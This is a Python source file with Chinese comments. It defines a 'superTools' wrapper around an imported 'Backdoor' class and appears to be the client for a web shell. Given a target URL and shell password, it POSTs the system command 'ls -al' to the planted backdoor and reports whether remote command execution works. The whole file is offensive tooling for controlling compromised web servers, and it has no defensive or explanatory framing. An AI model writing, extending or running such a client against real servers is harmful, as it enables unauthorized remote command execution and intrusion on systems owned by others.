import requests
import warnings
from requests.exceptions import RequestException
import re
import Backdoor_class


class superTools:
    def __init__(self):
        # 创建Backdoor类的实例
        self.backdoor = Backdoor_class.Backdoor()

    def initialization(self, Url: str, password: str) -> None:
        """
        初始化 Backdoor 实例。

        该方法用于初始化 Backdoor 实例，并设置其 URL 和密码属性。

        Args:
            Url (str): 要设置的 URL 字符串。
            password (str): 要设置的密码字符串。

        Returns:
            None

        Example:
            示例用法:
            - 调用 `initialization(Url, password)` 方法来初始化 Backdoor 实例，并设置 URL 和密码属性。
        """
        self.backdoor.setUrl(Url)
        self.backdoor.setanalyzeUrl()
        self.backdoor.setPassword(password)
        self.backdoor.printALLAttribute()

    def testUrl(self, timeoutvalue=2):
        try:
            self.backdoor.setSystemCmd_PostValue("ls -al")
            # 发送HTTP请求，设置连接超时为2秒
            response = requests.post(
                self.backdoor.Url, data=self.backdoor.post_data, timeout=timeoutvalue)

            # 检查响应状态码
            if response.status_code != 200:
                print("连接失败")
            print('---------------------响应---------------------')
            print(response.text)
            print('----------------------------------------------')
            if not response.text:
                print("密码错误")
            if '..' in response.text:
                # 自动检测时响应中包含 ".."则代表成功,否则命令执行失败
                print("连接成功")
            else:
                print("自行检查是否成功")

        # 错误响应
        except RequestException as e:
            if "timeout" in str(e):
                print("连接失败: 失败原因连接时间过长")
            else:
                print("连接失败:", str(e))
